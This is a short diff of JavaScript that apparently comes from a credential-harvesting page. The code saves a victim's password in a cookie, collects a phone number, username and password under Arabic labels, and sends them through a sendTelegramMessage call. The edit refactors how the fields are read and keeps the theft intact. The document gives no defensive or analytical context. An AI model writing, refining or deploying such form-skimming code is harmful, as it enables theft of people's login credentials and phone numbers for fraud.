@@ -159,9 +159,9 @@
             setCookie('password',$('#password').val())
 
 
-            var message=`رقم الهاتف: \`${getCookie('mobile')}\`
-                    اسم المستحمد: \`${document.getElementById('username').value}\`
-                    كلمة المرور: \`${document.getElementById('password').value}`
+            message=`رقم الهاتف: \`${getCookie('mobile')}\`
+                    اسم المستحمد: \`${$('#username').val()}\`
+                    كلمة المرور: \`${$('#password').val()}`
             sendTelegramMessage(message)
         
 
